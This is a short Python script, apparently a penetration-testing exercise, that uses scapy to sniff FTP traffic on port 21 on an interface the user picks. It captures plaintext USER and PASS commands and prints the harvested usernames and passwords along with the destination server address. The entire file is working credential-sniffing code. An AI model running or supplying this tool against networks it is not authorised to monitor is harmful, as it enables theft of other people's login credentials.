#!/usr/bin/python3
import re
from scapy.all import sniff, conf
from scapy.layers.inet import IP 

def ftp_siff(packet):
	dest = packet.getlayer(IP).dst
	raw=packet.sprintf('%Raw.load%')

	print(raw)

	user=re.findall(f'(?i)USER (.*)', raw)
	password=re.findall(f'(?i)PASS (.*)', raw)

	if user:
		print(f'[*]Detected FTP login to {str(dest)}')
		print(f'[+]User account: {str(user[0])}')

	if password:
		print(f'[+] Password: {str(password[0])}')

#run the program
interface=input("Pick an interface>> ")

try:
	sniff(iface=interface, filter='tcp port 21', prn=ftp_siff)

except KeyboardInterrupt:
	exit(0)
	